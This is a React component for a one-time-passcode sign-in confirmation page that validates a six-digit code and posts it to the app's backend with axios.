import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/otp.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const Otp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [loading, setLoading] = useState(false);

  const handleInputChange = (e) => {
    const value = e.target.value.replace(/\D/g, ""); // Remove non-digits
    e.target.value = value.slice(0, 6); // Limit to 6 digits
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
        reset(); // Clear the input field
        navigate("/otp"); // Replace with your desired route
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="otp">
      <div className="container">
        <div className="contentSec">
          <div className="title">Confirm Sign In</div>
          <span>We sent you a code by text message</span>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form onSubmit={handleSubmit(submitForm)}>
              <label>Code</label>
              <div className="formOtpInput">
                <input
                  name="otp"
                  type="text"
                  required
                  placeholder="******"
                  inputMode="numeric"
                  pattern="\d*"
                  {...register("otp")}
                  onInput={handleInputChange}
                />
              </div>
              <FormErrMsg errors={errors} inputName="otp" />
              <button type="submit" disabled={loading}>
                {loading ? "Loading..." : "Sign In"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Otp;
